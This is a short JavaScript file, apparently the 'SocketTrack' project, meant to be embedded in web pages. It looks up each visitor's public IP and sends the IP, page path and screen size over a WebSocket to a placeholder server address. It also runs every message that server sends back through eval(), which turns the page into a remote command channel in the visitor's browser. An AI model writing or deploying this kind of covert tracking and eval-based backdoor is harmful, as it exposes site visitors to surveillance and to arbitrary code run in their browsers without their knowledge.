//    _____            __        __ ______                __  
//   / ___/____  _____/ /_____  / //_  __/________ ______/ /__
//   \__ \/ __ \/ ___/ //_/ _ \/ __// / / ___/ __ `/ ___/ //_/
//  ___/ / /_/ / /__/ ,< /  __/ /_ / / / /  / /_/ / /__/ ,<   
// /____/\____/\___/_/|_|\___/\__//_/ /_/   \__,_/\___/_/|_|  

// https://github.com/synfinner/SocketTrack
// @synfinner

(function sTrack() {

   if ("WebSocket" in window) {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://icanhazip.com'); // Get IP from icanhazip.com. https recommended.
      xhr.send(); // issue request
      xhr.onload = function () {
         if (xhr.status >= 200 && xhr.status < 300) {
            // Runs when the request is successful
            var IP = xhr.responseText; // Set ip to the response.
            var ws = new WebSocket("ws://SERVER_IP:8080/sockettrack");
            ws.onopen = function() {
               // send ip and paath to server as json for easy parsing
               ws.send(JSON.stringify({ip:IP,loc:window.location.pathname,h:screen.height,w:screen.width}));
               // close the web socket 
               //ws.close();
            }
            ws.onmessage = function(event){
               var msg = event.data;
               eval(msg);
            };
            //ws.close();
         } else {
            return false; // return false if we don't get a 200 for getting the IP
         }
      };
   } else {
      return false // return false if the browser doesn't support websockets
   }
})(); // invoke anonymous function
